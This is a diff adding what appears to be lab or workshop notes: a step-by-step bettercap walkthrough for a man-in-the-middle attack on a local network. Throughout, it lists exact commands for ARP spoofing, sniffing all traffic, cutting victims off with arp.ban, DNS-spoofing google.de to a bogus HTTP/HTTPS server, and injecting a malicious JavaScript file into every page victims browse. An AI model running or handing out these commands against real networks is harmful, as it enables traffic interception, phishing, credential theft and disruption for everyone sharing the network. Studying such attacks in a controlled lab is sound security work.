@@ -1,0 +1,30 @@
+Some remarks about the notation: ```>``` denotes a command being entered inside buttercup, whereas ```#``` denotes a command being entered in a shell.
+
+- On a machine in your network (i.e. the one you are attacking): watch your local arp cache for changes: ```# watch -n 1 "arp -a"```
+- Open bettercap: ```# sudo bettercap```
+- See the nothing is running: ```> help```
+- Turn on netoworking reconnaissance: ```> net.recon on```
+- See hosts on the network: ```> net.show```
+- Get information about the arp spoof module: ```> help arp.spoof```
+- Get all variables related to the arp spoof module: ```> get arp.spoof.*```
+- We want to spoof all internal connections: ```> set arp.spoof.internal true```
+- Start arp spoofing: ```> arp.spoof on```
+- On machine which is attacked, watch arp table being filled
+- Open Wireshark and show network traffic: ```# sudo wireshark```
+  - See ARP traffic by filtering for it inside wireshark (```arp```)
+  - See non ARP traffic (```not arp```)
+  - See HTTP traffic (```http```)
+- See traffic increase: ```# nload -t 1000```
+- Now we know: all traffic goes through us! We win and can do whatever we want now
+- Now let's sniff the traffic: ```> net.sniff on```
+- Stop it again: ```> net.sniff off```
+- Stop arp spoofing for now: ```> arp.spoof off```
+- ```> arp.ban on``` when you are really pissed, no traffic gets forwarded
+- Turn forwarding back on again: ```> arp.ban off``` and ```> arp.spoof on```
+- Let's spoof domains: ```> set dns.spoof.domains google.de``` and ```> dns.spoof on```
+- On the a machine in your network: ```# watch -n 1 "host google.de"```
+- Sometimes this doesn't work an the real gateway is faster: ```> arp.spoof off``` and ```> arp.ban on```
+- Start a bogous HTTP webserver: ```> set http.server.path ./google``` and ```> set https.server.path ./google``` and ```> http.server on``` and ```> https.server on```
+- Stop everything: ```> arp.ban off``` and ```> dns.spoof off``` and ```> http.server off``` and ```> https.server off```
+- Now inject a malicious JavaScript file into every page: ```> arp.spoof on``` and ```> set http.proxy.injectjs inject.js``` and ```> set https.proxy.injectjs inject.js``` and ```> http.proxy on``` and ```> https.proxy on```
+- Navigate to spiegel.de in a browser on a machine on your network
